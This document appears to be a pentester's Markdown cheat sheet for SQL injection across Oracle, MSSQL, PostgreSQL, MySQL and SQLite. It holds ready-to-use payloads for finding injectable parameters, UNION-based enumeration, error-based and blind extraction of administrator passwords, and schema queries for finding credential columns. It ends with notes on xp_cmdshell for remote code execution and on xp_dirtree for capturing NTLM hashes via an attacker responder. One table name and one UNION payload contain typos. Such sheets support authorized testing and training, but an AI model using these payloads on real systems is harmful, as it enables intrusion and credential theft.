# Entry point
if data is returned in the response, and it is unchanged after appending one of these payloads (or an error is returned) - the parameter might be vulnerable to SQLi.

Oracle / MSSQL / PostgreSQL / MySQL / SQLite
```
 --
; -- 
' --
'; -- 
" --
"; -- 
 /*
' /*
'; /* 
" /*
"; /* 
```
MySQL
```
 #
; # 
' #
'; # 
" #
"; # 
```
example query: SELECT role,fullname FROM users WHERE id='1' # '
# UNION attack
if data is returned in the response, the database can be enumerated using a union attack.
in this case, the first step is to figure out how many columns are returned by the query.
personally I like to supply an id or a username that does not exist so no row is returned,
and then unioning a row of my choice until data is returned by the application:
```
-1' UNION SELECT 1; # 
-1' UNION SELECT 1,2: # 
-1' UNION SELECT 1,2,3; # and so on ...
```
after some of the numbers we supplied are reflected in the response, we can replace them with
other builtin methods and attributes to further enumerate the database.

```diff
SELECT name,issue_date,valid_until FROM tickets WHERE ticket_id="
- 1" UNION SELECT 1,GROUP_CONCAT(table_name SEPARATOR "<br>") ,3 FROM information_schema.tables /*
"
```

### visible error
CAST does variable operations, can trigger error containing its output
```diff
SELECT * FROM users WHERE id='
-1'; 1=CAST((SELECT password FROM users LIMIT 1) AS int);--
'
```

### time delay
```
SELECT pg_sleep(10); -- PostgreSQL
```

### group_concat
allows concatenating columns with separators to fit in single column that might be unioned to original query
```
string_agg(username || ':' || password, '<br>') FROM users; -- PostgreSQL
GROUP_CONCAT(CONCAT(username, ':', password) SEPARATOR '<br>') FROM users; # MySQL
GROUP_CONCAT(username || ':' || password, '<br>') FROM users; -- SQLite
```

# Version enumeration
```
SELECT version() # PostgreSQL / MySQL / MariaDB
SELECT @@version -- MSSQL + # MySQL
SELECT sqlite_version() /* SQLite
SELECT banner FROM v$version -- Oracle
SELECT version FROM v$instance -- Oracle
```
# Blind
if data is not directly returned in the response, we can trigger conditional errors or time delays, using stacked queries, concatenated strings and union attacks:
```
' UNION SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE ' ' END FROM users WHERE username='administrator'-- -
' UNION SELECT CASE WHEN SUBSTR(password,§1§,1)='§char§' THEN TO_CHAR(1/0) ELSE ' ' END FROM users WHERE username='administrator'-- - cluster bomb with number list and bruteforcer

select case when substring(password,§1§,1)='§char§' then pg_sleep(5) else pg_sleep(0) end from users where username='admin' -- PostgreSQL
```

# Data exfiltration
some of the queries I like to run in order to enumerate the database contents further

Oracle
```
SELECT DISTINCT owner FROM all_tables; -- list databases
SELECT table_name, column_name FROM all_tab_cols WHERE column_name LIKE '%ser%'; /* lists columns like User, username and user */
SELECT table_name, column_name FROM all_tab_cols WHERE column_name LIKE '%ass%'; -- same but for pass or Password
```
MSSQL
```
SELECT name FROM master.sys.databases;
SELECT t.name AS table_name, c.name AS column_name FROM sys.tables t JOIN sys.columns c ON t.object_id = c.object_id WHERE c.name LIKE '%ass%'; 
```
PostgreSQL
```
SELECT datname FROM pg_database;
SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%ass%';
```
MySQL
```
SELECT table_name FROM information_shcema.tables WHERE table_schema NOT IN ('mysql','information_schema','performance_schema'); # list all non default table names
```
# Tricks
MSSQL can run system stored procedures such as xp_cmdshell which can be abused to move laterally.
xp_cmdshell -> direct RCE
xp_dirtree -> lists the contents of a folder. can be run against an attacker responder to get service user NTLM.
